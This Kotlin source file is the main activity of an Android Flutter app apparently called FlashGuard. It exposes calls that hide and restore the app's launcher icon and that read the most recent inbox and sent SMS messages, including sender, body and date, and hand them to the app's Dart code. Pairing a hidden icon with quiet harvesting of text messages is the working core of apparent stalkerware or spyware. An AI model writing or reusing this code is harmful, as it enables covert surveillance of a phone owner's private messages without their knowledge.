package com.flashguard.flashguard

import android.content.ComponentName
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val CHANNEL = "com.flashguard/control"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {

                    // ── Icon hide / show ───────────────────────────────────
                    "hideIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "com.flashguard.flashguard.MainActivityAlias"),
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            result.success(true)
                        } catch (e: Exception) {
                            result.error("HIDE_ICON_FAILED", e.message, null)
                        }
                    }

                    "showIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "com.flashguard.flashguard.MainActivityAlias"),
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            result.success(true)
                        } catch (e: Exception) {
                            result.error("SHOW_ICON_FAILED", e.message, null)
                        }
                    }

                    // ── Read SMS ──────────────────────────────────────────
                    "getSmsLogs" -> {
                        try {
                            val smsList = mutableListOf<Map<String, Any?>>()
                            val cursor: Cursor? = contentResolver.query(
                                Uri.parse("content://sms/inbox"),
                                arrayOf("address", "body", "date", "read", "type"),
                                null, null, "date DESC"
                            )
                            cursor?.use { c ->
                                var count = 0
                                while (c.moveToNext() && count < 30) {
                                    smsList.add(mapOf(
                                        "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
                                        "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
                                        "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
                                        "read"    to c.getInt(c.getColumnIndexOrThrow("read")),
                                        "type"    to "inbox"
                                    ))
                                    count++
                                }
                            }
                            // Also read sent SMS
                            val sentCursor: Cursor? = contentResolver.query(
                                Uri.parse("content://sms/sent"),
                                arrayOf("address", "body", "date", "read", "type"),
                                null, null, "date DESC"
                            )
                            sentCursor?.use { c ->
                                var count = 0
                                while (c.moveToNext() && count < 20) {
                                    smsList.add(mapOf(
                                        "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
                                        "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
                                        "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
                                        "read"    to c.getInt(c.getColumnIndexOrThrow("read")),
                                        "type"    to "sent"
                                    ))
                                    count++
                                }
                            }
                            smsList.sortByDescending { it["date"] as Long }
                            result.success(smsList.take(40))
                        } catch (e: Exception) {
                            result.error("SMS_READ_FAILED", e.message, null)
                        }
                    }

                    else -> result.notImplemented()
                }
            }
    }
}
